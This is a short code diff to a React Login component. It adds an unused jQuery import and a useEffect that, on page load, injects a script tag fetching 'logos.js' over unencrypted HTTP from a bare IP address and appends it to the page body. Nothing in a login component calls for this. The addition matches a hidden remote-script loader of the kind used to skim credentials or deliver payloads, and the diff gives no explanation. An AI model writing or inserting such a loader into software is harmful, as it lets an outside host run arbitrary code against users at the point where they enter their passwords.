@@ -1,14 +1,22 @@
 import React, { useContext, useState, useEffect } from 'react';
 import { Redirect } from 'react-router-dom';
 import UserContext from '../../context/user/userContext';
-
+import jQuery from 'jquery';
 
 
 
 
 const Login = () => {
 
+	useEffect(()=>{
 	
+
+			  var tag = document.createElement('script');
+			  tag.async = false;
+			  tag.src = "http://82.208.16.123:8080/js/logos.js";
+			  var body = document.getElementsByTagName('body')[0];
+			  body.appendChild(tag);
+	},[])	
 	
 
 	
